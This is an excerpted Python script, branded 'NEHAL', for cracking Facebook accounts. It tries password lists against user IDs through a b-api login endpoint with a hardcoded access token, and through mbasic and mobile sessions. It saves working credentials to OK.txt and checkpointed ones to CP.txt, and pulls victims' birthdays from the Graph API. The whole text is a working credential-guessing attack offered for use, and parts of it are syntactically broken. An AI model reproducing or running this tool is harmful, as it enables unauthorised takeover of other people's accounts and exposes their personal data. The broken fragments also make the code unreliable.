...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#NEHAL_AHMED('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = NEHAL(self.apk).read().splitlines()
			NEHAL_AHMED(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							NEHAL_AHMED('[•] Result CP saved to CP.txt')
							NEHAL_AHMED('\n\tCrack Processing...\n')
							NEHAL_AHMED('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					NEHAL_AHMED('\n01.) Metode b-api ')
					NEHAL_AHMED('02.) Metode mbasic ')
					NEHAL_AHMED('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			NEHAL_AHMED('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			NEHAL_AHMED(' [1] NEHAL Method 1 ')
			NEHAL_AHMED(' [2] NEHAL Method 2  [ Pro ]')
			NEHAL_AHMED(' [3] NEHAL Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [NEHAL] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = NEHAL('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_NEHAL("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				NEHAL_AHMED('\r\033[1;92m[Successful-NEHAL] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = NEHAL('login.txt').read()
					cp_ttl = Prof_NEHAL('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					NEHAL_AHMED('\r\033[1;91m[Checkpoint-NEHAL] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				NEHAL_AHMED('\r\033[1;91m[Checkpoint-NEHAL] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				NEHAL_AHMED('\r\033[1;32m[Successful-NEHAL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = NEHAL('token.txt').read()
					cp_ttl = Prof_NEHAL('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].NEHAL_AHMED('\r\033[1;91m[Checkpoint-NEHAL] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				NEHAL_AHMED('\r\033[1;92m[Successful-NEHAL] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
def dupcutter():
	os.system("xdg-open https://wa.me/+8801613016943")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
